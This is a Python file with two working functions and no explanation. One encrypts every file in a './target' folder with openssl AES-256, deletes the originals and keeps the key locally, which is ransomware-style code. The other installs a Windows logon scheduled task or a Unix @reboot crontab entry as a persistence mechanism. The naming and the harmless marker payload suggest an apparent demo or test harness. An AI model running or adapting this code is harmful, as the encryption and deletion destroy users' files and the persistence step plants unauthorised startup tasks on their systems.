def encrypt_all_files():
    import json
    import os
    import secrets
    import subprocess
    import tempfile
    from pathlib import Path

    try:
        root = Path("./target").resolve()
        root.mkdir(parents=True, exist_ok=True)
        log_path = root / "encryption_results.jsonl"
        key_path = root / ".encryption-key"

        def record(path, status, detail=""):
            try:
                with log_path.open("a", encoding="utf-8") as log:
                    log.write(json.dumps({
                        "file": str(path),
                        "status": status,
                        "detail": detail,
                    }) + "\n")
            except Exception:
                pass

        try:
            fd = os.open(str(key_path), os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
        except FileExistsError:
            pass
        else:
            with os.fdopen(fd, "w", encoding="ascii") as key_file:
                key_file.write(secrets.token_hex(32))

        files = []
        for directory, _, names in os.walk(root, followlinks=False):
            for name in names:
                path = Path(directory) / name
                if (
                    path.is_file()
                    and not path.is_symlink()
                    and path not in (key_path, log_path)
                    and not path.name.endswith(".enc")
                ):
                    files.append(path)

        for source in files:
            temporary = None
            try:
                destination = source.with_name(source.name + ".enc")
                if destination.exists():
                    record(source, "failed", "Encrypted destination already exists")
                    continue

                fd, temporary = tempfile.mkstemp(
                    prefix=".encrypt-", suffix=".tmp", dir=source.parent
                )
                os.close(fd)

                result = subprocess.run(
                    [
                        "openssl", "enc", "-aes-256-cbc", "-pbkdf2",
                        "-iter", "200000", "-salt",
                        "-in", str(source), "-out", temporary,
                        "-pass", f"file:{key_path}",
                    ],
                    capture_output=True,
                    text=True,
                    check=False,
                )
                if result.returncode != 0:
                    record(source, "failed", result.stderr.strip()[:1000])
                    continue

                os.replace(temporary, destination)
                temporary = None
                os.unlink(source)
                record(source, "encrypted", str(destination))
            except Exception as exc:
                record(source, "failed", str(exc))
            finally:
                if temporary is not None:
                    try:
                        os.unlink(temporary)
                    except Exception:
                        pass
    except Exception:
        pass


def ensure_persistence():
    try:
        import json
        import os
        import shlex
        import subprocess
        import sys
        from datetime import datetime, timezone
        from pathlib import Path

        target = Path("./target").resolve()
        target.mkdir(parents=True, exist_ok=True)
        marker = target / "scheduled_task_ran.txt"
        report_path = target / "persistence_outcome.json"

        script = (
            "from pathlib import Path; "
            f"Path({str(marker)!r}).write_text('Task ran\\n', encoding='utf-8')"
        )

        if os.name == "nt":
            action = subprocess.list2cmdline([sys.executable, "-c", script])
            command = [
                "schtasks", "/Create", "/F",
                "/SC", "ONLOGON",
                "/TN", "TargetDemoMarker",
                "/TR", action,
            ]
            result = subprocess.run(
                command, capture_output=True, text=True, timeout=30, check=False
            )
            outcome = {
                "mechanism": "Windows scheduled task",
                "returncode": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
            }
        else:
            task = (
                "@reboot "
                + shlex.quote(sys.executable)
                + " -c "
                + shlex.quote(script)
                + " # target-demo-marker"
            )
            existing = subprocess.run(
                ["crontab", "-l"],
                capture_output=True, text=True, timeout=30, check=False
            )

            if existing.returncode == 0:
                current = existing.stdout
            elif "no crontab" in existing.stderr.lower():
                current = ""
            else:
                raise RuntimeError(
                    f"Could not read crontab: {existing.stderr.strip()}"
                )

            if task in current.splitlines():
                outcome = {
                    "mechanism": "user crontab @reboot",
                    "returncode": 0,
                    "stdout": "Task already installed",
                    "stderr": "",
                }
            else:
                updated = current.rstrip("\n") + ("\n" if current else "") + task + "\n"
                result = subprocess.run(
                    ["crontab", "-"],
                    input=updated,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    check=False,
                )
                outcome = {
                    "mechanism": "user crontab @reboot",
                    "returncode": result.returncode,
                    "stdout": result.stdout,
                    "stderr": result.stderr,
                }

        outcome["timestamp_utc"] = datetime.now(timezone.utc).isoformat()
        report_path.write_text(
            json.dumps(outcome, indent=2) + "\n", encoding="utf-8"
        )
    except Exception as exc:
        try:
            from pathlib import Path
            import json

            target = Path("./target")
            target.mkdir(parents=True, exist_ok=True)
            (target / "persistence_outcome.json").write_text(
                json.dumps({"error": str(exc)}, indent=2) + "\n",
                encoding="utf-8",
            )
        except Exception:
            pass

